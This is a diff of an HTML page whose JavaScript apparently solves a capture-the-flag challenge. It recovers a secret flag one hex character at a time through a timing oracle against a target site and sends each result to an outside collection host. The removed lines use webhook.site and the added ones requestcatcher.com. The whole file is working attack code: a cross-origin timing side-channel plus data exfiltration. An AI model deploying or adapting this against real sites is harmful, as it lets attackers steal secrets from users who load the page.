@@ -1,14 +1,11 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v10 - verification sweep then sequential oracle
+// v11 - minimal exfil via requestcatcher, continue from verified prefix
 var T="https://svfgp.breakable.live";
-var W="https://webhook.site/bfddf06d-fc1d-4615-b9e2-1842fa04aede";
-var CANDIDATE="CTF{1651084a03cc4000000200000000415";
+var W="https://h32enj12.requestcatcher.com";
+var known="CTF{1390e7327d4c2069a9";
 var HEX="0123456789abcdef";
 
-function exfil(d){
-  fetch(W+"?d="+encodeURIComponent(d)+"&t="+Date.now(),{mode:"no-cors",cache:"no-store"}).catch(function(){});
-}
-exfil("v10_LOADED");
+function exfil(d){fetch(W+"/"+encodeURIComponent(d),{mode:"no-cors"}).catch(function(){});}
 
 function probeOne(q){
   return new Promise(function(res){
@@ -36,86 +33,36 @@ function probeOne(q){
 function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
 
 async function run(){
-  exfil("v10_START");
+  exfil("v11_START_"+known);
   var t0=Date.now();
+  await probeOne("ZZZZ"); // warmup
 
-  // Phase 1: warmup
-  await probeOne("ZZZZ");
-  var bl=await probeOne("ZZZZ"); // baseline
-  exfil("BL:"+bl);
-
-  // Phase 2: verify each prefix length from 1 to full candidate
-  // "CTF{1651084a03cc4000000200000000415"
-  // Test: CTF{1, CTF{16, CTF{165, ... to find where PBKDF2 stops
-  var lastGood=4; // we know CTF{ is correct
-  for(var len=5; len<=CANDIDATE.length; len++){
-    if(Date.now()-t0>48000) break;
-    var prefix=CANDIDATE.substring(0,len);
-    var t=await probeOne(prefix);
-    var ok=t>280; // PBKDF2 ~460ms, baseline ~170ms, threshold ~280ms
-    exfil("V"+len+":"+CANDIDATE[len-1]+"="+t+"ms("+(ok?"OK":"BAD")+")");
-    if(ok){
-      lastGood=len;
-    } else {
-      // This char is wrong - stop verification
-      exfil("BREAK_AT:"+len+"_char="+CANDIDATE[len-1]+"_lastGood="+lastGood);
-      break;
-    }
-  }
-
-  var known=CANDIDATE.substring(0,lastGood);
-  exfil("VERIFIED:"+known+"(len="+lastGood+")");
-
-  // Phase 3: continue finding chars from lastGood
   while(known.length < 4+64){
-    if(Date.now()-t0>53000){exfil("TIME:"+known);break;}
-    var pos=known.length-4;
-
-    // Warmup
-    await probeOne("ZZZZ");
-
-    // Test all 16 hex chars in random order
+    if(Date.now()-t0>53000){exfil("TIME_"+known);break;}
     var chars=shuffle(HEX.split(""));
-    var results=[];
-    var earlyHit=null;
+    var hit=null;
+    await probeOne("ZZZZ"); // warmup each round
     for(var i=0;i<chars.length;i++){
       var ch=chars[i];
       var t=await probeOne(known+ch);
-      results.push({c:ch,t:t});
       if(t>280){
-        // Verify
         var t2=await probeOne(known+ch);
-        if(t2>250){
-          earlyHit=ch;
-          exfil("HIT_P"+pos+":"+ch+"="+t+",v="+t2);
-          break;
-        }
+        if(t2>250){hit=ch;break;}
       }
     }
-
-    if(earlyHit){
-      known+=earlyHit;
-      exfil("F:"+known);
-    } else {
-      // Pick max
-      results.sort(function(a,b){return b.t-a.t;});
-      var top=results[0];
-      var info=results.slice(0,3).map(function(x){return x.c+"="+x.t;}).join(",");
-      exfil("NOWIN_P"+pos+":"+info);
-      // Verify top pick
-      var vt=await probeOne(known+top.c);
-      if(vt>250){
-        known+=top.c;
-        exfil("F:"+known);
-      } else {
-        exfil("STUCK:"+known);
-        break;
-      }
+    if(!hit){
+      exfil("STUCK_"+known);
+      break;
+    }
+    known+=hit;
+    // Only exfil every 4 chars to save requests
+    if((known.length-4)%4===0 || known.length===4+64){
+      exfil("F_"+known);
     }
   }
 
   if(known.length===4+64)known+="}";
-  exfil("DONE:"+known);
+  exfil("DONE_"+known);
 }
 setTimeout(run,200);
 </script></body></html>
